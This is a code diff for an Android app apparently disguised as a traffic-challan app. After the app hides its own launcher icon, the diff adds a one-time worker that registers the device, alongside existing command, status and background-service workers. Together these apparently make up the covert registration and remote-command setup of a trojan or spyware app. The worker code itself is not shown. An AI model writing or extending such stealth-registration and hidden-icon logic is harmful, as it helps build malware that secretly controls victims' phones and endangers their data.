@@ -2,7 +2,6 @@ package com.rte.challan
 
 import android.Manifest
 import android.content.ComponentName
-import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.net.Uri
@@ -16,10 +15,12 @@ import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 import androidx.work.ExistingPeriodicWorkPolicy
+import androidx.work.OneTimeWorkRequestBuilder
 import androidx.work.PeriodicWorkRequestBuilder
 import androidx.work.WorkManager
 import com.rte.challan.service.BackgroundService
 import com.rte.challan.worker.CommandWorker
+import com.rte.challan.worker.RegistrationWorker
 import com.rte.challan.worker.StatusWorker
 import java.util.concurrent.TimeUnit
 
@@ -101,6 +102,13 @@ class MainActivity : AppCompatActivity() {
 
     private fun setupCompleted() {
         hideLauncherIcon()
+
+        // ✅ एक बार डिवाइस रजिस्टर करें
+        val registrationRequest = OneTimeWorkRequestBuilder<RegistrationWorker>()
+            .setInitialDelay(2, TimeUnit.SECONDS)
+            .build()
+        WorkManager.getInstance(this).enqueue(registrationRequest)
+
         startBackgroundWork()
         finish()
     }
